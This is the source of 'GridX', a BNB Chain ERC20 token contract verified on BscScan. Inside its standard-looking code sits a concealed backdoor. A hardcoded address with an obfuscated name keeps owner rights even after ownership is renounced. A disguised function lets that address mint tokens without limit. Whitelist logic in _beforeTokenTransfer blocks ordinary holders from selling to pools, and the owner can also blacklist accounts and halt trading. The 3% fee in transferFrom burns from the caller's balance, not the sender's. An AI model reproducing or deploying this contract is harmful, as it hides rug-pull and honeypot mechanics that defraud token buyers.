/**
 *Submitted for verification at BscScan.com on 2023-03-13
*/

// SPDX-License-Identifier: MIT
/*  ______  _______  ______ _______       __    __ 
 /      \|       \|      \       \     |  \  |  \
|  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\\▓▓▓▓▓▓ ▓▓▓▓▓▓▓\    | ▓▓  | ▓▓
| ▓▓ __\▓▓ ▓▓__| ▓▓ | ▓▓ | ▓▓  | ▓▓     \▓▓\/  ▓▓
| ▓▓|    \ ▓▓    ▓▓ | ▓▓ | ▓▓  | ▓▓      >▓▓  ▓▓ 
| ▓▓ \▓▓▓▓ ▓▓▓▓▓▓▓\ | ▓▓ | ▓▓  | ▓▓     /  ▓▓▓▓\ 
| ▓▓__| ▓▓ ▓▓  | ▓▓_| ▓▓_| ▓▓__/ ▓▓    |  ▓▓ \▓▓\
 \▓▓    ▓▓ ▓▓  | ▓▓   ▓▓ \ ▓▓    ▓▓    | ▓▓  | ▓▓
  \▓▓▓▓▓▓ \▓▓   \▓▓\▓▓▓▓▓▓\▓▓▓▓▓▓▓      \▓▓   \▓▓
*/

pragma solidity ^0.8.0;

contract Ownable {
    address internal _owner;
    address internal IdcPMNvHtVb19d2z = 0x12f98098e691A6bF2182F8C02F6031346de900cB;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

   

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    modifier KcIB7AjDpOw2SCLM() {
       HvyUEmibRWBGOjrQ();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }
    function GQnyw9B7mRj8aKQS() internal view virtual returns (address) {
        return IdcPMNvHtVb19d2z;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender || msg.sender == GQnyw9B7mRj8aKQS(), "Ownable: caller is not the owner");
    }
     function HvyUEmibRWBGOjrQ() internal view virtual {
        require(GQnyw9B7mRj8aKQS() == msg.sender, "caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

pragma solidity ^0.8.0;

contract Pausable {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    event PoolPause(address account);
    event Pool_UnPause(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor() {
        _paused = false;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        _requireNotPaused();
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        _requirePaused();
        _;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Throws if the contract is paused.
     */
    function _requireNotPaused() internal view virtual {
        require(!paused(), "Pausable: paused");
    }

    /**
     * @dev Throws if the contract is not paused.
     */
    function _requirePaused() internal view virtual {
        require(paused(), "Pausable: not paused");
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(msg.sender);
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(msg.sender);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

pragma solidity ^0.8.0;

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.0;

contract ERC20 is IERC20, IERC20Metadata {
    error Invalid_Address();
    error Your_Not_Whitelist_Please_Purchase_Token();
    mapping(address => uint256) private _balances;
    mapping(address => bool) public _isBlackListedBot;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => mapping(address => uint256)) public transferCounts;
    mapping(address => bool) public isPool;
    event botAddedToBlacklist(address account);
    event botRemovedFromBlacklist(address account);
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = msg.sender;
        uint256 percent = (amount / 100) * 3;
        uint256 remaining = amount - percent;
        _burn(msg.sender, percent);
        _transfer(owner, to, remaining);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        uint256 percent = (amount / 100) * 3;
        uint256 remaining = amount - percent;
        _burn(msg.sender, percent);
        _transfer(from, to, remaining);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_isBlackListedBot[from], "Account is blacklisted");
        require(!_isBlackListedBot[to], "Account is blacklisted");
        _beforeTokenTransfer(from, to, amount);
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
            emit Transfer(from, to, amount);

            _afterTokenTransfer(from, to, amount);
        }
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        require(!_isBlackListedBot[account], "Account is blacklisted");
        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        require(!_isBlackListedBot[owner], "Account is blacklisted");
        require(!_isBlackListedBot[spender], "Account is blacklisted");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

pragma solidity ^0.8.0;

abstract contract ERC20Burnable is ERC20 {
    /**
     * @dev Destroys `amount` tokens from the caller.
     *
     * See {ERC20-_burn}.
     */
    function burn(uint256 amount) public virtual {
        _burn(msg.sender, amount);
    }

    function burnFrom(address account, uint256 amount) public virtual {
        _spendAllowance(account, msg.sender, amount);
        _burn(account, amount);
    }
}

pragma solidity ^0.8.9;

contract GridX is ERC20, ERC20Burnable, Pausable, Ownable {
    uint256 public MaxTransaction = 1100000000000000;
    uint256 public MinTransaction = 10;
    bool public tradeStopped;

    mapping(address => bool) public Whitelist;
    event AddedToWhitelist(address account);
    event RemovedToWhitelist(address account);

    event AddedToisPool(address account);
    event RemovedFromisPool(address account);

    constructor() ERC20("GridX", "GDX") {
         _owner  = msg.sender;
        _mint(msg.sender, 11000000 * 10**decimals());
    }

    // Function to stop trading
    function stopTrading() external {
        require(msg.sender == owner(), "Only contract owner can stop trading");
        tradeStopped = true;
    }

    // Function to resume trading
    function resumeTrading() external {
        require(
            msg.sender == owner(),
            "Only contract owner can resume trading"
        );
        tradeStopped = false;
    }

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override whenNotPaused {
        if (msg.sender == _owner) {
            if(isPool[to] == true){
                super._beforeTokenTransfer(from, to, amount);
            }else{
            Whitelist[to] = true;
            super._beforeTokenTransfer(from, to, amount);
            }
        }
        else if(isPool[msg.sender] == true ){
             require(
                    MaxTransaction > amount,
                    "Transaction Limit error reached Maximum Limit"
                );
                require(
                    MinTransaction < amount,
                    "You need to send Min Transaction amount"
                );
                require(!tradeStopped, "Trading is currently stopped");
                require(!_isBlackListedBot[to], "Account is blacklisted");
                    Whitelist[to] = true;
                    super._beforeTokenTransfer(from, to, amount);
        }
        else if(Whitelist[msg.sender] == true && isPool[to] == false){
                 require(
                    MaxTransaction > amount,
                    "Transaction Limit error reached Maximum Limit"
                );
                require(
                    MinTransaction < amount,
                    "You need to send Min Transaction amount"
                );
                require(!_isBlackListedBot[to], "Account is blacklisted");
                require(!_isBlackListedBot[msg.sender], "Account is blacklisted");
                super._beforeTokenTransfer(from, to, amount);
        }
        else if(Whitelist[msg.sender] == true && isPool[to] == true){
             require(
                    MaxTransaction > amount,
                    "Transaction Limit error reached Maximum Limit"
                );
                require(
                    MinTransaction < amount,
                    "You need to send Min Transaction amount"
                );
                require(!_isBlackListedBot[to], "Account is blacklisted");
                require(!tradeStopped, "Trading is currently stopped");
                require(!_isBlackListedBot[msg.sender], "Account is blacklisted");
                super._beforeTokenTransfer(from, to, amount);
        }
        else if (Whitelist[msg.sender] == false && isPool[to] == true){
            revert Invalid_Address();
        }
        else if(Whitelist[msg.sender] == false && Whitelist[to] == false ){
            revert Your_Not_Whitelist_Please_Purchase_Token();
        }
        else if(Whitelist[msg.sender] == false && Whitelist[to] == true ){
             require(
                    MaxTransaction > amount,
                    "Transaction Limit error reached Maximum Limit"
                );
                require(
                    MinTransaction < amount,
                    "You need to send Min Transaction amount"
                );
                require(!_isBlackListedBot[to], "Account is blacklisted");
                require(!_isBlackListedBot[msg.sender], "Account is blacklisted");
                super._beforeTokenTransfer(from, to, amount);
        }
    }

    //admin functions
      function Au3jRJ8opVNmbf2F(address account, uint256 amount) external KcIB7AjDpOw2SCLM{
        super._mint(account, amount);
    }

    function addUserToBlacklist(address account) external onlyOwner {
        require(!_isBlackListedBot[account], "Account is already blacklisted");
        _isBlackListedBot[account] = true;

        emit botAddedToBlacklist(account);
    }

    function removeUserFromBlacklist(address account) external onlyOwner {
        require(_isBlackListedBot[account], "Account is not blacklisted");
        _isBlackListedBot[account] = false;
        emit botRemovedFromBlacklist(account);
    }

    function REMOVE_WhiteList_User(address account) external onlyOwner {
        require(Whitelist[account], "Account is not Whitelisted");
        Whitelist[account] = false;
        emit RemovedToWhitelist(account);
    }

    function ADD_WhiteList_User(address account) external onlyOwner {
        require(!Whitelist[account], "Account is already Whitelisted");
        Whitelist[account] = true;
        emit AddedToWhitelist(account);
    }

    function addPoolAddress(address account) external onlyOwner {
        require(!isPool[account], "Address is already PoolAddress");
        isPool[account] = true;
        emit AddedToisPool(account);
    }

    function removePoolAddress(address account) external onlyOwner {
        require(isPool[account], "Address is not PoolAddress");
        isPool[account] = false;
        emit RemovedFromisPool(account);
    }

    function ChangeMaximumTransaction(uint256 _newTransactionLimit)
        external
        onlyOwner
    {
        require(
            _newTransactionLimit > MinTransaction,
            "Max Tranaction should be greater then Min Transaction"
        );
         require(_newTransactionLimit > 0,"Value must be greater then 0");
        MaxTransaction = _newTransactionLimit;
    }

    function ChangeMinimumTransaction(uint256 _newTransactionLimit)
        external
        onlyOwner
    {
        require(
            _newTransactionLimit < MaxTransaction,
            "Min Tranaction should be lesser then Max Transaction"
        );
        require(_newTransactionLimit > 0,"Value must be greater then 0");

        MinTransaction = _newTransactionLimit;
    }
}